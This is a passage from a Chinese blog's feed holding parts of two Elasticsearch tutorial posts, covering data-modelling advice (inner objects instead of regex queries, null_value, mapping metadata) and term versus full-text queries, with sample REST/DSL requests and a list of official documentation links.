class="attr">"cookies.name"</span>: <span class="string">"age"</span></span><br><span class="line">            &#125;&#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">"range"</span>:&#123;</span><br><span class="line">                <span class="attr">"cookies.intValue"</span>:&#123;</span><br><span class="line">                  <span class="attr">"gte"</span>:<span class="number">30</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过-Nested-对象保存-Key-Value-的一些不足"><a href="#通过-Nested-对象保存-Key-Value-的一些不足" class="headerlink" title="通过 Nested 对象保存 Key / Value 的一些不足"></a>通过 Nested 对象保存 Key / Value 的一些不足</h3><ul><li>可以减少字段数量，解决 Cluster State 中 保存过多 Meta 信息的问题，但是<ul><li>导致查询语句复杂度增加</li><li>Nested 对象 ，不利于在 Kibana 汇总实现可视化分析</li></ul></li></ul><h3 id="建模建议（三）：避免正则查询"><a href="#建模建议（三）：避免正则查询" class="headerlink" title="建模建议（三）：避免正则查询"></a>建模建议（三）：避免正则查询</h3><ul><li>问题：<ul><li>正则，通配符查询，前缀查询属于 Term 查询，但是性能不够好</li><li>特别是将通配符放在开头，会导致性能的灾难</li></ul></li><li>案例：<ul><li>文档中某个字段包含了 ES 的版本信息，例如 version：“7.1.0”</li><li>搜索所有是 bug fix 的版本？每个主要版本号所关联的文档？</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Mapping中加入元信息，便于管理</span></span><br><span class="line">PUT softwares/</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"_meta"</span>: &#123;</span><br><span class="line">      <span class="attr">"software_version_mapping"</span>: <span class="string">"1.0"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET softwares/_mapping</span><br><span class="line">PUT softwares/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"software_version"</span>:<span class="string">"7.1.0"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解决方案：将字符串转换为对象"><a href="#解决方案：将字符串转换为对象" class="headerlink" title="解决方案：将字符串转换为对象"></a>解决方案：将字符串转换为对象</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 优化, 使用inner object</span></span><br><span class="line">PUT softwares/</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"_meta"</span>: &#123;</span><br><span class="line">      <span class="attr">"software_version_mapping"</span>: <span class="string">"1.1"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">      <span class="attr">"version"</span>: &#123;</span><br><span class="line">        <span class="attr">"properties"</span>: &#123;</span><br><span class="line">          <span class="attr">"display_name"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"hot_fix"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"byte"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"marjor"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"byte"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"minor"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"byte"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过 Inner Object 写入多个文档</span></span><br><span class="line">PUT softwares/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"version"</span>: &#123;</span><br><span class="line">    <span class="attr">"display_name"</span>: <span class="string">"7.1.0"</span>,</span><br><span class="line">    <span class="attr">"marjor"</span>: <span class="number">7</span>,</span><br><span class="line">    <span class="attr">"minor"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"hot_fix"</span>: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT softwares/_doc/2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"version"</span>: &#123;</span><br><span class="line">    <span class="attr">"display_name"</span>: <span class="string">"7.2.0"</span>,</span><br><span class="line">    <span class="attr">"marjor"</span>: <span class="number">7</span>,</span><br><span class="line">    <span class="attr">"minor"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">"hot_fix"</span>: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT softwares/_doc/3</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"version"</span>: &#123;</span><br><span class="line">    <span class="attr">"display_name"</span>: <span class="string">"7.2.1"</span>,</span><br><span class="line">    <span class="attr">"marjor"</span>: <span class="number">7</span>,</span><br><span class="line">    <span class="attr">"minor"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">"hot_fix"</span>: <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="搜索过滤"><a href="#搜索过滤" class="headerlink" title="搜索过滤"></a>搜索过滤</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过 bool 查询，实现 filter 过滤，避免正则查询，大大提升性能。</span></span><br><span class="line">POST softwares/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"filter"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"match"</span>: &#123;</span><br><span class="line">            <span class="attr">"version.marjor"</span>: <span class="number">7</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"match"</span>: &#123;</span><br><span class="line">            <span class="attr">"version.minor"</span>: <span class="number">2</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="建模建议（四）：避免空置引起的聚合不准"><a href="#建模建议（四）：避免空置引起的聚合不准" class="headerlink" title="建模建议（四）：避免空置引起的聚合不准"></a>建模建议（四）：避免空置引起的聚合不准</h3><p><img src="/images/big-data/es-06/61.jpg" alt="61"></p><h3 id="使用-Null-Value-解决空值的问题"><a href="#使用-Null-Value-解决空值的问题" class="headerlink" title="使用 Null_Value 解决空值的问题"></a>使用 Null_Value 解决空值的问题</h3><p><img src="/images/big-data/es-06/62.jpg" alt="62"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Not Null 解决聚合的问题</span></span><br><span class="line">DELETE ratings</span><br><span class="line">PUT ratings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">      <span class="attr">"properties"</span>: &#123;</span><br><span class="line">        <span class="attr">"rating"</span>: &#123;</span><br><span class="line">          <span class="attr">"type"</span>: <span class="string">"float"</span>,</span><br><span class="line">          <span class="attr">"null_value"</span>: <span class="number">1.0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT ratings/_doc/1</span><br><span class="line">&#123;</span><br><span class="line"> <span class="attr">"rating"</span>:<span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line">PUT ratings/_doc/2</span><br><span class="line">&#123;</span><br><span class="line"> <span class="attr">"rating"</span>:<span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST ratings/_search</span><br><span class="line">POST ratings/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"avg"</span>: &#123;</span><br><span class="line">      <span class="attr">"avg"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"rating"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST ratings/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"term"</span>: &#123;</span><br><span class="line">      <span class="attr">"rating"</span>: &#123;</span><br><span class="line">        <span class="attr">"value"</span>: <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="建模建议（五）：为索引的-Mapping-加入-Meta-的信息"><a href="#建模建议（五）：为索引的-Mapping-加入-Meta-的信息" class="headerlink" title="建模建议（五）：为索引的 Mapping 加入 Meta 的信息"></a>建模建议（五）：为索引的 Mapping 加入 Meta 的信息</h3><ul><li>Mappings 设置非常重要，需要从两个维度进行考虑<ul><li>功能：索引，聚合，排序</li><li>性能：存储的开销；内存的开销；搜索的性能</li></ul></li><li>Mappings 设置是一个迭代的过程<ul><li>加入新的字段容易（必要时需要 update_by_query）</li><li>更新删除字段不允许（需要 Reindex 重建数据）</li><li>最好能对 Mappings 加入 Meta 信息，更好的进行版本管理</li><li>可以考虑 Mapping 文件上传 git 进行管理</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Mapping中加入元信息，便于管理</span></span><br><span class="line">PUT softwares/</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"_meta"</span>: &#123;</span><br><span class="line">      <span class="attr">"software_version_mapping"</span>: <span class="string">"1.0"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《Elasticsearch核心技术与实战》</li><li><a href="https://www.elastic.co/cn/blog/a-new-era-for-cluster-coordination-in-elasticsearch" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/a-new-era-for-cluster-coordination-in-elasticsearch</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/search-aggregations-metrics.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/search-aggregations-metrics.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/search-aggregations-bucket.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/search-aggregations-bucket.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/search-aggregations-pipeline.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/search-aggregations-pipeline.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-nested-query.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-nested-query.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-has-child-query.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-has-child-query.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-has-parent-query.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-has-parent-query.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-parent-id-query.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-parent-id-query.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/docs-reindex.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/docs-reindex.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/docs-update-by-query.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/docs-update-by-query.html</a></li><li><a href="https://www.elastic.co/cn/blog/should-i-use-logstash-or-elasticsearch-ingest-nodes" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/should-i-use-logstash-or-elasticsearch-ingest-nodes</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/ingest-apis.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/ingest-apis.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/ingest-processors.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/ingest-processors.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/painless/7.1/painless-lang-spec.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/painless/7.1/painless-lang-spec.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/painless/7.1/painless-api-reference.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/painless/7.1/painless-api-reference.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/general-recommendations.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/general-recommendations.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/tune-for-disk-usage.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/tune-for-disk-usage.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/tune-for-search-speed.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/tune-for-search-speed.html</a></li></ul><style>  img {    zoom: 50%;  }</style>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;深入了解 ES 集群、分页、聚合分析、父子文档、数据建模等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="Elastic Stack" scheme="https://xinlichao.cn/tags/Elastic-Stack/"/>
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
  </entry>
  
  <entry>
    <title>重学 Elastic Stack 之 Elasticsearch 深入了解(一)</title>
    <link href="https://xinlichao.cn/back-end/big-data/es-05/"/>
    <id>https://xinlichao.cn/back-end/big-data/es-05/</id>
    <published>2021-02-06T15:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.670Z</updated>
    
    <content type="html"><![CDATA[<p>深入了解 ES 高级搜索、相关性评分、搜索建议、自动补全等。</p><a id="more"></a><h2 id="基于词项和基于全文的搜索"><a href="#基于词项和基于全文的搜索" class="headerlink" title="基于词项和基于全文的搜索"></a>基于词项和基于全文的搜索</h2><h3 id="基于-Term-的查询"><a href="#基于-Term-的查询" class="headerlink" title="基于 Term 的查询"></a>基于 Term 的查询</h3><ul><li>Term 的 重要性<ul><li><strong>Term 是表达语意的最小单位</strong>。搜索和利用统计语言模型进行自然语言处理都需要处理 Term</li></ul></li><li>特点<ul><li>Term Level Query：Term Query / Range Query / Exists Query / Prefix Query / Wildcard Query</li><li>在 ES 中，Term 查询，对输入<strong>不做分词</strong>。会将输入作为一个整体，在倒排索引中查找准确的词项，并且使用相关度算分公式为每个包含该词项的文档进行<strong>相关度算分</strong> - 例如 “Apple Store”</li><li>可以通过 Constant Score 将查询转换换成一个 Filtering，<strong>避免算分，并利用缓存</strong>，提交性能</li></ul></li></ul><p><strong>Demo</strong> </p><ul><li>插入数据</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DELETE products</span><br><span class="line">PUT products</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"number_of_shards"</span>: <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST /products/_bulk</span><br><span class="line">&#123; <span class="attr">"index"</span>: &#123; <span class="attr">"_id"</span>: <span class="number">1</span> &#125;&#125;</span><br><span class="line">&#123; <span class="attr">"productID"</span> : <span class="string">"XHDK-A-1293-#fJ3"</span>,<span class="attr">"desc"</span>:<span class="string">"iPhone"</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span>: &#123; <span class="attr">"_id"</span>: <span class="number">2</span> &#125;&#125;</span><br><span class="line">&#123; <span class="attr">"productID"</span> : <span class="string">"KDKE-B-9947-#kL5"</span>,<span class="attr">"desc"</span>:<span class="string">"iPad"</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span>: &#123; <span class="attr">"_id"</span>: <span class="number">3</span> &#125;&#125;</span><br><span class="line">&#123; <span class="attr">"productID"</span> : <span class="string">"JODL-X-1937-#pV7"</span>,<span class="attr">"desc"</span>:<span class="string">"MBP"</span> &#125;</span><br></pre></td></tr></table></figure><ul><li>查询</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 多字段 Mapping 和 Term 查询</span></span><br><span class="line">GET /products/_mapping</span><br><span class="line"></span><br><span class="line">POST /products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"term"</span>: &#123;</span><br><span class="line">      <span class="attr">"desc"</span>: &#123;</span><br><span class="line">        <span class="comment">//"value": "iPhone"</span></span><br><span class="line">        <span class="attr">"value"</span>:<span class="string">"iphone"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST /products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"term"</span>: &#123;</span><br><span class="line">      <span class="attr">"desc.keyword"</span>: &#123;</span><br><span class="line">        <span class="attr">"value"</span>: <span class="string">"iPhone"</span> <span class="comment">//查不到数据，term查询</span></span><br><span class="line">        <span class="comment">//"value":"iphone" // 查到数据 term查询会做分词</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST /products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"term"</span>: &#123;</span><br><span class="line">      <span class="attr">"productID"</span>: &#123;</span><br><span class="line">        <span class="attr">"value"</span>: <span class="string">"XHDK-A-1293-#fJ3"</span>  <span class="comment">// 无结果</span></span><br><span class="line">        <span class="comment">// "value": "xhdk" //有一条数据</span></span><br><span class="line">        <span class="comment">// "value": "xhdk-a-1293-#fj3"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果对值进行查询</span></span><br><span class="line">POST /products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//"explain": true,</span></span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"term"</span>: &#123;</span><br><span class="line">      <span class="attr">"productID.keyword"</span>: &#123;</span><br><span class="line">        <span class="attr">"value"</span>: <span class="string">"XHDK-A-1293-#fJ3"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="复合查询-Constant-Score-转为-Filter"><a href="#复合查询-Constant-Score-转为-Filter" class="headerlink" title="复合查询 - Constant Score 转为 Filter"></a>复合查询 - Constant Score 转为 Filter</h3><ul><li>将 Query 转成 Filter，忽略 TF-IDF 计算，避免相关性算分的开销</li><li>Filter 可以有效利用缓存</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /products/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"explain"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"constant_score"</span>: &#123;</span><br><span class="line">      <span class="attr">"filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"term"</span>: &#123;</span><br><span class="line">          <span class="attr">"productID.keyword"</span>: <span class="string">"XHDK-A-1293-#fJ3"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基于全文本的查询"><a href="#基于全文本的查询" class="headerlink" title="基于全文本的查询"></a>基于全文本的查询</h3><ul><li>基于全文本的查找<ul><li>Match Query / Match Phrase Query / Query String Query</li></ul></li><li>特点<ul><li>索引和搜索时会进行分词，查询字符串先传递到一个合适的分词器，然后生成一个供查询的词项列表</li><li>查询时候，先<strong>会对输入的查询进行分词</strong>。然后每个词项逐个进行底层的查询，最终将结果进行合并。并未每个文档生成一个算分。 例如查 “Martix reloaded”, 会查到包括 Matrix 或者 reload 的所有结果。</li></ul></li></ul><h4 id="Match-Query-Result"><a href="#Match-Query-Result" class="headerlink" title="Match Query Result"></a>Match Query Result</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>:&#123;</span><br><span class="line">        <span class="attr">"query"</span>: <span class="string">"Matrix reloaded"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>:&#123;</span><br><span class="line">        <span class="attr">"query"</span>: <span class="string">"Matrix reloaded"</span>,</span><br><span class="line">        <span class="attr">"operator"</span>: <span class="string">"AND"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Minimun-should-match"><a href="#Minimun-should-match" class="headerlink" title="Minimun_should_match"></a>Minimun_should_match</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST movies/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>:<span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"title"</span>:&#123;</span><br><span class="line">        <span class="attr">"query"</span>: <span class="string">"Matrix reloaded"</span>,</span><br><span class="line">        <span class="attr">"minimum_should_match"</span>: <span class="number">2</span> </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Match-Phrase-Query"><a 